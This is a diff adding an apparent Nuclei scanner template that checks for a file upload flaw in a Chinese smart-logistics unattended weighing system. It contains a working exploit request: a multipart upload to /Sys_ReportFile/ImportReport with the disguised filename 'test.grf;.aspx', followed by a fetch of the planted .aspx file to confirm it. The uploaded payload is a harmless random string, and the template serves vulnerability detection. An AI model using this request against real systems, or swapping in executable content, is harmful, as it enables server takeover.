@@ -1,0 +1,53 @@
+id: poc-yaml-yszn-wu-liu-unattended-system-file-upload
+info:
+  name: 易思智能物流无人值守系统文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件上传
+  description: |
+    This template detects a file upload vulnerability in 易思智能物流无人值守系统.
+
+variables:
+  t1: "{{rand_base(3)}}"
+  t2: "{{md5(t1)}}"
+  t3: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /Sys_ReportFile/ImportReport?encode={{t2}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxzUhGld6cusN3Alk
+
+        ------WebKitFormBoundaryxzUhGld6cusN3Alk
+        Content-Disposition: form-data; name="file"; filename="test.grf;.aspx"
+        Content-Type: application/octet-stream
+
+        {{t3}}
+
+        ------WebKitFormBoundaryxzUhGld6cusN3Alk--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+
+  - method: GET
+    path:
+      - /GRF/Custom/{{t2}}.aspx
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t3}}"
+        part: body
